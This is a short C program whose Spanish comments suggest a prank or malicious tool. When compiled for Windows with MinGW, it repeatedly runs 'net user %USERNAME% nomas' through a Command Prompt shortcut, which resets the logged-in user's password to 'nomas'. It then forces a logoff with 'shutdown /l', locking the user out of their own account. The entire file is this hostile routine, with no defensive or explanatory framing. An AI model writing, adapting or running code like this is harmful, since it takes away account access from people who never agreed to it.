#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#ifdef __linux__
#define hi 2
#endif
#ifdef __MINGW32__
#define hi 1
#endif

int main(){

	// char frase[20]="hola";
	// sprintf(frase,"hola %i",hi);
	
	// char *car = frase;

	if(hi==1){

		int proceso = 5;

		while (proceso!=0){
			proceso = system("C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\\"01 - Command Prompt.lnk\" /B /c net user %USERNAME% nomas");
		}
		
		system("shutdown /l");
		//%username% = usuario que esta en uso ahora
	}

	return 0;
}
